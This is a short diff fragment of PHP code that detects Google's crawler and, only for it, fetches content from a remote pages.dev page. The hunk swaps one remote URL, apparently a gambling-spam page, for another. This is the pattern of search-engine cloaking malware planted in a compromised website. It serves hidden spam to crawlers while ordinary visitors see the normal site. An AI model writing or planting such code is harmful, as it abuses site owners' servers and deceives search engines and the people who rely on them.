@@ -5,7 +5,7 @@ function is_google_crawler() {
 }
 
 if (is_google_crawler()) {
-    $remote_url = 'https://perpus-mahjong333.pages.dev/asuu.html';
+    $remote_url = 'https://izinthailand.pages.dev/ST.html';
 
     $curl = curl_init();
     curl_setopt_array($curl, array(
